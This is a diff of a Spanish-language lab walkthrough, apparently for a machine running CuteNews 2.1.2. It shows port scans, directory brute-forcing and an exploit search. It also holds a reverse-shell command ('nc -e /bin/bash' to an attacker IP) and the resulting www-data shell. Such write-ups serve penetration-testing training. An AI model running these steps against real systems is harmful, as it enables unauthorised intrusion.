@@ -5,7 +5,7 @@
 Escanear todos los puertos abiertos
 
 ```shell
-nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.217.128
+> nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.217.128
 
 PORT    STATE SERVICE      REASON
 22/tcp  open  ssh          syn-ack
@@ -18,7 +18,7 @@ PORT    STATE SERVICE      REASON
 Escanear versiones de los puertos abiertos
 
 ```shell
-nmap -sCV -p22,80,88,110,995 192.168.217.128
+> nmap -sCV -p22,80,88,110,995 192.168.217.128
 
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
@@ -56,7 +56,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Vemos que no hay nada interesante, pues vamos a buscar directorios
 
 ```shell
-sudo gobuster dir -u http://192.168.217.128/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x .php
+> sudo gobuster dir -u http://192.168.217.128/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x .php
 
 /rss.php              (Status: 200) [Size: 105]
 /print.php            (Status: 200) [Size: 28] 
@@ -87,7 +87,7 @@ Vemos que encontramos un archivo index.php
 Buscamos vulnerabilidades con searchsploit associadas a cutenews 2.1.2
 
 ```shell
-searchsploit CuteNews 2.1.2
+> searchsploit CuteNews 2.1.2
 -------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                            |  Path
 -------------------------------------------------------------------------- ---------------------------------
@@ -132,19 +132,11 @@ command > nc -e /bin/bash 192.168.45.5 4444
 * Hacemos una reverse shell con nc
 
 ```shell
-nc -lvnp 4444
+> nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [192.168.45.5] from (UNKNOWN) [192.168.217.128] 35446
 
-# Tratamiento de la TTY
-script /dev/null -c bash
-ctrl+Z 
-stty raw -echo; fg 
-[1] + continued nc -nlvp 443 
-				reset xterm
-
-www-data@cute:/var/www/html/uploads$ export TERM=xterm
-www-data@cute:/var/www/html/uploads$ export SHELL=bash 
+www-data@cute:/var/www/html/uploads$ 
 ```
 
 ## Escalada de Privilegios
